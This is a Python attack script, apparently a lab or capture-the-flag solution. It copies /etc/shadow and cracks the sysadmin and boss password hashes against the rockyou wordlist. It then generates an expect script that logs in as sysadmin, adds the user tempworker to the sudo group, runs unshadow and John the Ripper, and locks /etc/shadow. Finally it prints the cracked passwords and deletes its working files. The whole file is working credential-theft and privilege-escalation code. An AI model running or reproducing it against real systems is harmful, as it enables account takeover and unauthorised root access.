#!/usr/bin/env python3

name = 'tempworker'
global sysadminsalt
global sysadminFullKey
global sysAdminPass

global bosssalt
global bossFullKey
global bossPass
buddyPass="test"

import crypt, subprocess, re, os, time

def createScript():
    f = open("sysadmin.exp", "w+")
    f.write('#!/usr/bin/expect'+"\n")
    f.write('set password [lindex $argv 0]'+"\n")
    f.write('set dir [lindex $argv 1]'+"\n")
    f.write('spawn su sysadmin'+"\n")
    f.write('expect "Password:" { send "$password\\r" }'+"\n")
    f.write('expect "$ " { send "sudo chmod 0000 /etc/shadow\\r" }'+"\n")
    f.write('expect "*password*" { send "$password\\r" }'+"\n")
    f.write('expect "$ " { send "sudo touch $dir/test\\r" }'+"\n")
    f.write('expect "$ " { send "sudo chmod a+rwx $dir/test\\r" }'+"\n")
    f.write('expect "$ " { send "sudo touch $dir/johnout\\r" }'+"\n")
    f.write('expect "$ " { send "sudo chmod a+rwx $dir/johnout\\r" }'+"\n")
    f.write('expect "$ " { send "sudo usermod -a -G sudo tempworker\\r" }'+"\n")
    f.write('expect "$ " { send "sudo unshadow /etc/passwd /etc/shadow > $dir/test\\r" }'+"\n") 
    f.write('expect "*$*" { send "sudo john --format=sha512crypt --wordlist=/usr/share/john/password.lst $dir/test\\r" }'+"\n")
    f.write('expect "*$*" { send "sudo john --show $dir/test > $dir/johnout\\r" }'+"\n")
    f.write('expect "*$*" { send "exit\\r" }'+"\n")
    f.write('interact'+"\n")
    f.close()

def getTextFile():
    subprocess.call(["cp", "/usr/share/wordlists/rockyou.txt.gz", "./"])
    subprocess.call(["gunzip", "rockyou.txt.gz"])
    subprocess.call(["cp", "/etc/shadow", "./"])

def cleanUp():
    subprocess.call(["rm", "./rockyou.txt"])
    subprocess.call(["rm", "./shadow"])
    subprocess.call(["rm", "./test"])
    subprocess.call(["rm", "./sysadmin.exp"])
    subprocess.call(["rm", "./johnout"])
    print(bossPass)
    print(buddyPass)
    print(sysAdminPass)

def getSysAdminInfo(file):
    global sysadminsalt
    global sysadminFullKey
    a = re.compile('(sysadmin)')
    s = re.compile('(\$6\$.+\$)')
    p = re.compile('(\$6\$[^:]*)')
    if a.match(file):
        foundSalt = s.findall(file)[0]
        sysadminsalt = foundSalt[:-1]
        sysadminFullKey = p.findall(file)[0]

def getBossInfo(file):
    global bosssalt
    global bossFullKey
    a = re.compile('(yourboss)')
    s = re.compile('(\$6\$.+\$)')
    p = re.compile('(\$6\$[^:]*)')
    if a.match(file):
        foundSalt = s.findall(file)[0]
        bosssalt = foundSalt[:-1]
        bossFullKey = p.findall(file)[0]

def getBuddyPass(file):
        global buddyPass
        a = re.compile('(yourbuddy)')
        s = re.compile('(?<=yourbuddy:)(.+?)(?=:)')
        if a.match(file):
           buddyPass = s.findall(file)[0]

def openBuddyFile():
        with open("johnout", 'r', errors='ignore') as s:
                for line in s:
                        getBuddyPass(line)

def getLoginInfo():
    with open("shadow", 'r') as s:
        for line in s: 
            getSysAdminInfo(line)
            getBossInfo(line)
                
def getsysadmin():
    global sysAdminPass
    with open("rockyou.txt", 'r', errors='ignore') as f:
        for word in f:
            word = word.rstrip("\n\r")
            cryptword = crypt.crypt(word, sysadminsalt)
            if cryptword == sysadminFullKey:
                sysAdminPass=word
                return

def getBossPassword():
    global bossPass
    with open("rockyou.txt" , 'r', errors='ignore') as f:
        for word in f:
            word = word.rstrip("\n\r")
            cryptword = crypt.crypt(word, bosssalt)
            if cryptword == bossFullKey:
                bossPass = word
                return

def fixEtcShadow():
        os.system(" chmod +x sysadmin.exp")
        dir_path = os.path.dirname(os.path.realpath(__file__))
        FNULL = open(os.devnull, 'w')
        subprocess.Popen(['./sysadmin.exp %s %s' %(sysAdminPass, dir_path)], shell=True, stdout=FNULL, stderr=subprocess.STDOUT)

def main():
    createScript()
    getTextFile() 
    getLoginInfo()
    getBossPassword()
    getsysadmin()
    fixEtcShadow()
    time.sleep(30)
    openBuddyFile()
    cleanUp()

if __name__ == '__main__':
    main()
